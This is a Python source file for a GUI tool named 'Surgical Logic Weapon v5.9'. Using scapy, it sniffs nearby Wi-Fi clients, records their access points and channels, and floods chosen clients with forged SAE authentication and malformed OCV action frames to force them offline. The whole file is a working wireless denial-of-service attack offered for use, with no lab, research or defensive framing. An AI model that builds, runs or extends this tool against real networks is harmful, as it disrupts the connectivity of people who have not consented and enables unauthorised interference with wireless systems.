import os, sys, time, threading
from scapy.all import *
import tkinter as tk

class SurgicalWeaponV5_9:
    def __init__(self, iface):
        self.iface = iface
        self.discovered = {}  # {Client_MAC: {"BSSID": bssid, "Channel": ch}}
        self.active_attacks = set()
        self.current_ch = 1
        self.running = True
        
        self.set_monitor_mode()
        
        self.root = tk.Tk()
        self.root.title("Surgical Logic Weapon v5.9")
        self.root.geometry("850x650")
        self.root.configure(bg="#050505")

        # --- UI Components ---
        self.listbox = tk.Listbox(self.root, bg="#111", fg="#00FF41", font=("Courier", 10), height=20)
        self.listbox.pack(padx=10, pady=10, fill="both", expand=True)

        btn_frame = tk.Frame(self.root, bg="#050505")
        btn_frame.pack(pady=10)
        
        # Logic: Separate buttons for different protocol vulnerabilities
        tk.Button(btn_frame, text="OCV KICK", command=lambda: self.start_attack("OCV"), bg="#aa5500", fg="white", width=12).pack(side="left", padx=5)
        tk.Button(btn_frame, text="SAE RESET", command=lambda: self.start_attack("SAE"), bg="#880000", fg="white", width=12).pack(side="left", padx=5)
        tk.Button(btn_frame, text="SAVE LIST", command=self.save_discovered, bg="#0044aa", fg="white", width=12).pack(side="left", padx=5)
        tk.Button(btn_frame, text="STOP/CLEAN", command=self.shutdown, bg="#444", fg="white", width=12).pack(side="left", padx=5)

        self.status = tk.Label(self.root, text="System Ready.", bg="#050505", fg="#00FF41")
        self.status.pack()

        # Threads
        threading.Thread(target=self.hopper, daemon=True).start()
        threading.Thread(target=self.fast_scanner, daemon=True).start()
        threading.Thread(target=self.attack_logic_loop, daemon=True).start()

    def set_monitor_mode(self):
        print(f"[*] Locking {self.iface} into Monitor Mode...")
        os.system("sudo airmon-ng check kill")
        os.system(f"sudo ip link set {self.iface} down")
        os.system(f"sudo iw dev {self.iface} set type monitor")
        os.system(f"sudo ip link set {self.iface} up")

    def hopper(self):
        while self.running:
            for ch in range(1, 14):
                if not self.active_attacks and self.running:
                    os.system(f"sudo iw dev {self.iface} set channel {ch}")
                    self.current_ch = ch
                    time.sleep(0.5)
                elif not self.running: break
                else: time.sleep(1)

    def fast_scanner(self):
        def callback(pkt):
            if pkt.haslayer(Dot11) and self.running:
                dot11 = pkt.getlayer(Dot11)
                # addr2 = Source, addr3 = BSSID
                if dot11.addr2 and dot11.addr3 and dot11.addr2 != dot11.addr3:
                    client, bssid = dot11.addr2, dot11.addr3
                    if client not in self.discovered and client != "ff:ff:ff:ff:ff:ff":
                        self.discovered[client] = {"BSSID": bssid, "Channel": self.current_ch}
                        self.root.after(0, self.refresh_ui)
        sniff(iface=self.iface, prn=callback, store=0)

    def attack_logic_loop(self):
        while self.running:
            for client, mode in list(self.active_attacks):
                data = self.discovered.get(client)
                if not data: continue
                b = data["BSSID"]
                dot11 = RadioTap()/Dot11(addr1=b, addr2=client, addr3=b)
                
                if mode == "SAE":
                    pkt = dot11/Dot11Auth(algo=3, seqnum=1, status=0)
                else: # OCV Logic
                    pkt = dot11/Dot11Action(category=10, action=4)/Raw(load=b"\xff\x0a\x01\x01")
                
                sendp(pkt, iface=self.iface, verbose=False, count=3)
            time.sleep(0.3)

    def start_attack(self, mode):
        for i in self.listbox.curselection():
            mac = list(self.discovered.keys())[i]
            # Logic: Freeze hopper and lock channel
            os.system(f"sudo iw dev {self.iface} set channel {self.discovered[mac]['Channel']}")
            self.active_attacks.add((mac, mode))
        self.refresh_ui()

    def save_discovered(self):
        # Your original file-saving logic
        with open("list.txt", "w") as f:
            for mac, info in self.discovered.items():
                f.write(f"Client: {mac} | AP: {info['BSSID']} | CH: {info['Channel']}\n")
        self.status.config(text="Targets saved to list.txt")

    def refresh_ui(self):
        self.listbox.delete(0, tk.END)
        for mac, info in self.discovered.items():
            is_hit = any(mac == m for m, mode in self.active_attacks)
            prefix = " [!] " if is_hit else " [+] "
            self.listbox.insert(tk.END, f"{prefix} {mac} | AP: {info['BSSID']} | CH: {info['Channel']}")

    def shutdown(self):
        print("[*] Restoring Network Logic...")
        self.running = False
        self.active_attacks.clear()
        os.system(f"sudo ip link set {self.iface} down")
        os.system(f"sudo iw dev {self.iface} set type managed")
        os.system(f"sudo ip link set {self.iface} up")
        os.system("sudo systemctl restart NetworkManager")
        self.root.destroy()

if __name__ == "__main__":
    if len(sys.argv) < 2: print("Usage: sudo python3 weapon.py [interface]")
    else: SurgicalWeaponV5_9(sys.argv[1]).root.mainloop()
